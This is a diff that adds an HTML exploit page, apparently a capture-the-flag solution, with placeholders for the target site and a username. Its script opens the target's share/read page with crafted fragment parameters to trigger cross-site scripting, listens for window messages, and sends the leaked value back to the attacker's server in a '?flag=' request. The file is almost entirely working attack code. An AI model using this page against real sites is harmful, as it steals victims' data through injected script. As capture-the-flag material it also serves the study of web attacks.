@@ -1,0 +1,20 @@
+<html>
+
+<body>
+    <script>
+        const sleep = (ms) => new Promise((resolve) => setInterval(resolve, ms))
+        const TARGET = "{{target}}";
+        var res;
+        (async () => {
+            res = await fetch("/create_next_note")
+            open(TARGET + `/share/read#id=${await res.text()}&username={{username}}`, "sold")
+            res = await fetch("/create_xss")
+            open(TARGET + `/share/read#id=${await res.text()}&username={{username}}`, "sold")
+            addEventListener("message", (ev)=>{
+                fetch("/?flag="+ev.data)
+            })
+        })()
+    </script>
+</body>
+
+</html>
